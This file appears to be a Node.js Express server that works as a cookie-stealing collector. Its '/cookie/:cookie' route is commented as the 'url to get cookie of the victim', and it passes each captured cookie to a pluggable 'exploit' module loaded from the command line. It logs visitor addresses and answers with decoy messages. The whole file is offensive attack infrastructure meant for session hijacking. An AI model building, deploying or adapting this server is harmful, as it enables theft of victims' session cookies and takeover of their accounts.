var fs = require('fs');
var express = require('express');
var http = require('http');
var message = require('./lib/message.js')
var module = null;

var moduleFile = null;

var app = express();
var server = http.createServer(app); 

var logger = function(req, res, next) {
	message.log(req.connection.remoteAddress + " tried to access : " + req.url)
    next(); // Passing the request to the next handler in the stack.
}

// Configuration
app.configure(function() {
    app.use(logger); // Here you add your logger to the stack.
    app.use(app.router); // The Express routes handler.
});


// /cookie/:cookie : url to get cookie of the victim
app.get('/cookie/:cookie*', function(req, res) {
	// sending req
	// getting the cookie with req.params.cookie
	module.exploit(req);
	res.send('Nothing to see here as well.');
});

app.get('/', function(req, res) {
	res.send("You have nothing to see here.");
});

// check for command line argument configuration file.json
if (process.argv[2] == undefined) {
	console.log("Usage : node server.js <module.js> <port : default 8080>");
	process.exit(1);
} else {
	message.info("Using " + process.argv[2] + " as dynamic module");
	moduleFile  = process.argv[2];

	// try opening file  and raise error if there's any
	fs.readFile(moduleFile, 'utf8', function (err, data) {
		if (err) {
			message.error('Error while trying to open : ' + process.argv[2]);
			process.exit(-1);
		}
		module = require(moduleFile);

		server.listen(process.argv[3] == undefined ? 8080 : process.argv[3]);
		message.info("Listening on port " + server.address().port);
	});
}